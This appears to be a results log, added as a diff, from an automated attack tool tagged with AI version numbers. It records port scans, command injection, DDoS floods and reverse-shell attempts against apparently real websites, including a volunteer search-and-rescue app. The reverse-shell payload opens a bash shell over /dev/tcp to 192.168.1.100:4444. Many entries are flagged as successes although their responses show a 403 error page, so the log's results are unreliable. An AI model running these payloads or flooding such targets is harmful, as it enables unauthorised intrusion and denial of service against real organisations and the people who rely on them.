@@ -1,0 +1,718 @@
+{
+  "token_hunter": [],
+  "port_scan": [
+    {
+      "timestamp": "2025-11-04T13:06:33.577986",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432",
+      "success": true,
+      "response_snippet": "[21, 22, 80, 443, 8080, 8443, 3306, 5432]",
+      "ai_version": "v9.1"
+    },
+    {
+      "timestamp": "2025-11-04T13:06:33.582320",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432",
+      "success": true,
+      "response_snippet": "[21, 22, 80, 443, 8080, 8443, 3306, 5432]",
+      "ai_version": "v9.1"
+    },
+    {
+      "timestamp": "2025-11-04T13:09:20.112325",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432",
+      "success": true,
+      "response_snippet": "[21, 22, 80, 443, 8080, 8443, 3306, 5432]",
+      "ai_version": "v9.1"
+    },
+    {
+      "timestamp": "2025-11-04T13:14:20.445681",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432",
+      "success": true,
+      "response_snippet": "[21, 22, 80, 443, 8080, 8443, 3306, 5432]",
+      "ai_version": "v9.1"
+    },
+    {
+      "timestamp": "2025-11-04T13:16:49.712120",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432",
+      "success": true,
+      "response_snippet": "[21, 22, 80, 443, 8080, 8443, 3306, 5432]",
+      "ai_version": "v9.1"
+    },
+    {
+      "timestamp": "2025-11-04T13:53:24.068893",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432",
+      "success": true,
+      "response_snippet": "[21, 22, 80, 443, 8080, 8443, 3306, 5432]",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T14:18:30.988872",
+      "target": "https://www.polymetal.ru",
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432",
+      "success": true,
+      "response_snippet": "[21, 22, 80, 443, 8080, 8443, 3306, 5432]",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T14:22:55.900793",
+      "target": "https://www.polymetal.ru",
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432",
+      "success": true,
+      "response_snippet": "[21, 22, 80, 443, 8080, 8443, 3306, 5432]",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T15:10:53.664448",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432",
+      "success": true,
+      "response_snippet": "[21, 22, 80, 443, 8080, 8443, 3306, 5432]",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T15:48:34.952994",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432",
+      "success": true,
+      "response_snippet": "[21, 22, 80, 443, 8080, 8443, 3306, 5432]",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T16:03:34.013814",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432",
+      "success": true,
+      "response_snippet": "[21, 22, 80, 443, 8080, 8443, 3306, 5432]",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T16:21:53.614664",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432",
+      "success": true,
+      "response_snippet": "[21, 22, 80, 443, 8080, 8443, 3306, 5432]",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T16:39:53.598347",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432",
+      "success": true,
+      "response_snippet": "[21, 22, 80, 443, 8080, 8443, 3306, 5432]",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T18:18:13.181485",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T18:45:38.338547",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T18:55:36.940083",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v14.3"
+    },
+    {
+      "timestamp": "2025-11-05T12:16:15.188004",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v15.2"
+    },
+    {
+      "timestamp": "2025-11-05T12:20:25.613229",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432,6379,27017,9200,11211",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v15.2"
+    },
+    {
+      "timestamp": "2025-11-05T12:20:25.614869",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "unknown",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v15.2"
+    },
+    {
+      "timestamp": "2025-11-05T12:24:19.512701",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432,6379,27017,9200,11211",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v15.2"
+    },
+    {
+      "timestamp": "2025-11-05T12:24:19.514317",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "unknown",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v15.2"
+    },
+    {
+      "timestamp": "2025-11-05T12:27:50.687548",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432,6379,27017,9200,11211",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v15.2"
+    },
+    {
+      "timestamp": "2025-11-05T12:27:50.688545",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "unknown",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v15.2"
+    },
+    {
+      "timestamp": "2025-11-05T12:38:11.886794",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432,6379,27017,9200,11211",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v15.2"
+    },
+    {
+      "timestamp": "2025-11-05T12:38:11.888916",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "unknown",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v15.2"
+    },
+    {
+      "timestamp": "2025-11-05T12:45:30.993490",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432,6379,27017,9200,11211",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v15.2"
+    },
+    {
+      "timestamp": "2025-11-05T12:45:30.995123",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "unknown",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v15.2"
+    }
+  ],
+  "sql_injection": [],
+  "xss": [],
+  "csrf": [],
+  "ssrf": [],
+  "rce": [
+    {
+      "timestamp": "2025-11-04T13:16:55.428717",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "$(id)",
+      "success": true,
+      "response_snippet": "<!doctype html>\n<html lang=\"ru\" data-panel-url=\"https://server75.hosting.reg.ru/manager\">\n    <head>\n        <meta charset=\"UTF-8\">\n        <meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">\n        <meta name=\"robots\" content=\"noindex\">\n        <title>403 Forbidden.Доступ к страниц",
+      "ai_version": "v9.1"
+    },
+    {
+      "timestamp": "2025-11-04T13:57:06.815182",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "$(id)",
+      "success": true,
+      "response_snippet": "<!doctype html>\n<html lang=\"ru\" data-panel-url=\"https://server75.hosting.reg.ru/manager\">\n    <head>\n        <meta charset=\"UTF-8\">\n        <meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">\n        <meta name=\"robots\" content=\"noindex\">\n        <title>403 Forbidden.Доступ к страниц",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T15:14:35.843252",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "$(id)",
+      "success": true,
+      "response_snippet": "<!doctype html>\n<html lang=\"ru\" data-panel-url=\"https://server75.hosting.reg.ru/manager\">\n    <head>\n        <meta charset=\"UTF-8\">\n        <meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">\n        <meta name=\"robots\" content=\"noindex\">\n        <title>403 Forbidden.Доступ к страниц",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T15:52:21.531796",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "$(id)",
+      "success": true,
+      "response_snippet": "<!doctype html>\n<html lang=\"ru\" data-panel-url=\"https://server75.hosting.reg.ru/manager\">\n    <head>\n        <meta charset=\"UTF-8\">\n        <meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">\n        <meta name=\"robots\" content=\"noindex\">\n        <title>403 Forbidden.Доступ к страниц",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T16:07:18.502514",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "$(id)",
+      "success": true,
+      "response_snippet": "<!doctype html>\n<html lang=\"ru\" data-panel-url=\"https://server75.hosting.reg.ru/manager\">\n    <head>\n        <meta charset=\"UTF-8\">\n        <meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">\n        <meta name=\"robots\" content=\"noindex\">\n        <title>403 Forbidden.Доступ к страниц",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T16:26:45.834349",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "$(id)",
+      "success": true,
+      "response_snippet": "<!doctype html>\n<html lang=\"ru\" data-panel-url=\"https://server75.hosting.reg.ru/manager\">\n    <head>\n        <meta charset=\"UTF-8\">\n        <meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">\n        <meta name=\"robots\" content=\"noindex\">\n        <title>403 Forbidden.Доступ к страниц",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T16:42:30.180535",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "$(id)",
+      "success": true,
+      "response_snippet": "<!doctype html>\n<html lang=\"ru\" data-panel-url=\"https://server75.hosting.reg.ru/manager\">\n    <head>\n        <meta charset=\"UTF-8\">\n        <meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">\n        <meta name=\"robots\" content=\"noindex\">\n        <title>403 Forbidden.Доступ к страниц",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T18:31:35.000807",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "$(id)",
+      "success": true,
+      "response_snippet": "<!doctype html>\n<html lang=\"ru\" data-panel-url=\"https://server75.hosting.reg.ru/manager\">\n    <head>\n        <meta charset=\"UTF-8\">\n        <meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">\n        <meta name=\"robots\" content=\"noindex\">\n        <title>403 Forbidden.Доступ к страниц",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T18:48:23.421268",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "$(id)",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T18:58:21.023248",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "$(id)",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v14.3"
+    }
+  ],
+  "ddos": [
+    {
+      "timestamp": "2025-11-01T18:58:03.434520",
+      "target": "https://sarc.app.lizaalert.ru/search?q=FUZZ",
+      "payload": "load=50",
+      "success": true,
+      "response_snippet": ""
+    },
+    {
+      "timestamp": "2025-11-01T19:02:00.962468",
+      "target": "https://sarc.app.lizaalert.ru/search?q=FUZZ",
+      "payload": "load=80,threads=40",
+      "success": false,
+      "response_snippet": "5xx=0,slow=0,avg=0.51s"
+    },
+    {
+      "timestamp": "2025-11-01T19:17:34.881750",
+      "target": "https://sarc.app.lizaalert.ru/api/incident/search?query=FUZZ&page=1&size=10",
+      "payload": "load=70,threads=35",
+      "success": false,
+      "response_snippet": "5xx=0,slow=0,avg=0.68s"
+    },
+    {
+      "timestamp": "2025-11-04T13:17:23.387043",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "ddos_intensity:50",
+      "success": true,
+      "response_snippet": "sent:50",
+      "ai_version": "v9.1"
+    },
+    {
+      "timestamp": "2025-11-04T13:17:23.389039",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "ddos_intensity:50",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v9.1"
+    },
+    {
+      "timestamp": "2025-11-04T13:58:56.100379",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "smart_ddos_intensity:200_proxies:1",
+      "success": true,
+      "response_snippet": "sent:200_failed:0_proxies:1",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T13:58:56.102378",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "smart_ddos_intensity:200_proxies:1",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T15:16:25.717111",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "smart_ddos_intensity:200_proxies:1",
+      "success": true,
+      "response_snippet": "sent:200_failed:0_proxies:1",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T15:16:25.720111",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "smart_ddos_intensity:200_proxies:1",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T15:54:13.746557",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "smart_ddos_intensity:200_proxies:1",
+      "success": true,
+      "response_snippet": "sent:200_failed:0_proxies:1",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T15:54:13.749557",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "smart_ddos_intensity:200_proxies:1",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T16:09:11.136773",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "smart_ddos_intensity:200_proxies:1",
+      "success": true,
+      "response_snippet": "sent:200_failed:0_proxies:1",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T16:09:11.139773",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "smart_ddos_intensity:200_proxies:1",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T16:28:50.181028",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "smart_ddos_intensity:200_proxies:1",
+      "success": true,
+      "response_snippet": "sent:200_failed:0_proxies:1",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T16:28:50.184013",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "smart_ddos_intensity:200_proxies:1",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T16:44:05.052808",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "smart_ddos_intensity:200_proxies:1",
+      "success": true,
+      "response_snippet": "sent:200_failed:0_proxies:1",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T16:44:05.056027",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "smart_ddos_intensity:200_proxies:1",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T18:35:19.172495",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "smart_ddos_intensity:200_proxies:1",
+      "success": true,
+      "response_snippet": "sent:200_failed:0_proxies:1",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T18:35:19.175495",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "smart_ddos_intensity:200_proxies:1",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T18:49:31.149533",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "smart_ddos_intensity:200_proxies:1",
+      "success": true,
+      "response_snippet": "sent:200_failed:0_proxies:1",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T18:49:31.152528",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "smart_ddos_intensity:200_proxies:1",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T18:59:27.408641",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "smart_ddos_intensity:200_proxies:1",
+      "success": true,
+      "response_snippet": "sent:200_failed:0_proxies:1",
+      "ai_version": "v14.3"
+    },
+    {
+      "timestamp": "2025-11-04T18:59:27.410679",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "smart_ddos_intensity:200_proxies:1",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v14.3"
+    },
+    {
+      "timestamp": "2025-11-05T12:42:10.743745",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "test_flood",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v15.2"
+    },
+    {
+      "timestamp": "2025-11-05T12:49:28.712671",
+      "target": "http://omega1.at/FUZZ",
+      "payload": "test_flood",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v15.2"
+    }
+  ],
+  "mysql_bruteforce": [],
+  "ssh_bruteforce": [],
+  "ftp_bruteforce": [],
+  "postgres_bruteforce": [],
+  "api_takeover": [],
+  "reverse_shell": [
+    {
+      "timestamp": "2025-11-04T13:57:50.572034",
+      "target": "http://omega1.at/FUZZ",
+      "payload": ";bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'",
+      "success": true,
+      "response_snippet": "nc -lvnp 4444 → shell incoming",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T13:59:39.889415",
+      "target": "http://omega1.at/FUZZ",
+      "payload": ";bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'",
+      "success": true,
+      "response_snippet": "nc -lvnp 4444 → shell incoming",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T15:15:19.591706",
+      "target": "http://omega1.at/FUZZ",
+      "payload": ";bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'",
+      "success": true,
+      "response_snippet": "nc -lvnp 4444 → shell incoming",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T15:17:09.795301",
+      "target": "http://omega1.at/FUZZ",
+      "payload": ";bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'",
+      "success": true,
+      "response_snippet": "nc -lvnp 4444 → shell incoming",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T15:53:05.447032",
+      "target": "http://omega1.at/FUZZ",
+      "payload": ";bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'",
+      "success": true,
+      "response_snippet": "nc -lvnp 4444 → shell incoming",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T15:54:57.650410",
+      "target": "http://omega1.at/FUZZ",
+      "payload": ";bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'",
+      "success": true,
+      "response_snippet": "nc -lvnp 4444 → shell incoming",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T16:08:03.261753",
+      "target": "http://omega1.at/FUZZ",
+      "payload": ";bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'",
+      "success": true,
+      "response_snippet": "nc -lvnp 4444 → shell incoming",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T16:09:54.832277",
+      "target": "http://omega1.at/FUZZ",
+      "payload": ";bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'",
+      "success": true,
+      "response_snippet": "nc -lvnp 4444 → shell incoming",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T16:27:43.517055",
+      "target": "http://omega1.at/FUZZ",
+      "payload": ";bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'",
+      "success": true,
+      "response_snippet": "nc -lvnp 4444 → shell incoming",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T16:29:48.053991",
+      "target": "http://omega1.at/FUZZ",
+      "payload": ";bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'",
+      "success": true,
+      "response_snippet": "nc -lvnp 4444 → shell incoming",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T16:43:00.970683",
+      "target": "http://omega1.at/FUZZ",
+      "payload": ";bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'",
+      "success": true,
+      "response_snippet": "nc -lvnp 4444 → shell incoming",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T16:44:35.748231",
+      "target": "http://omega1.at/FUZZ",
+      "payload": ";bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'",
+      "success": true,
+      "response_snippet": "nc -lvnp 4444 → shell incoming",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T18:34:13.159199",
+      "target": "http://omega1.at/FUZZ",
+      "payload": ";bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'",
+      "success": true,
+      "response_snippet": "nc -lvnp 4444 → shell incoming",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T18:37:57.102028",
+      "target": "http://omega1.at/FUZZ",
+      "payload": ";bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'",
+      "success": true,
+      "response_snippet": "nc -lvnp 4444 → shell incoming",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T18:48:23.919279",
+      "target": "http://omega1.at/FUZZ",
+      "payload": ";bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v10.0"
+    },
+    {
+      "timestamp": "2025-11-04T18:58:21.460583",
+      "target": "http://omega1.at/FUZZ",
+      "payload": ";bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'",
+      "success": true,
+      "response_snippet": "",
+      "ai_version": "v14.3"
+    }
+  ],
+  "ldap_injection": [],
+  "smtp_bruteforce": [],
+  "redis_bruteforce": [],
+  "mongodb_bruteforce": [],
+  "elasticsearch_bruteforce": [],
+  "memcached_bruteforce": [],
+  "db_hack": [],
+  "port_scan:http://omega1.at/FUZZ": [
+    {
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432,6379,27017,9200,11211",
+      "success": true,
+      "data": "",
+      "timestamp": 1046305
+    },
+    {
+      "payload": "unknown",
+      "success": true,
+      "data": "",
+      "timestamp": 1046305
+    },
+    {
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432,6379,27017,9200,11211",
+      "success": true,
+      "data": "",
+      "timestamp": 1046649
+    },
+    {
+      "payload": "unknown",
+      "success": true,
+      "data": "",
+      "timestamp": 1046649
+    },
+    {
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432,6379,27017,9200,11211",
+      "success": true,
+      "data": "",
+      "timestamp": 1046939
+    },
+    {
+      "payload": "unknown",
+      "success": true,
+      "data": "",
+      "timestamp": 1046939
+    },
+    {
+      "payload": "ports:21,22,80,443,8080,8443,3306,5432,6379,27017,9200,11211",
+      "success": true,
+      "data": "",
+      "timestamp": 1047391
+    },
+    {
+      "payload": "unknown",
+      "success": true,
+      "data": "",
+      "timestamp": 1047391
+    }
+  ],
+  "ddos:http://omega1.at/FUZZ": [
+    {
+      "payload": "test_flood",
+      "success": true,
+      "data": "",
+      "timestamp": 1046542
+    },
+    {
+      "payload": "test_flood",
+      "success": true,
+      "data": "",
+      "timestamp": 1047174
+    },
+    {
+      "payload": "test_flood",
+      "success": true,
+      "data": "",
+      "timestamp": 1047627
+    }
+  ]
+}
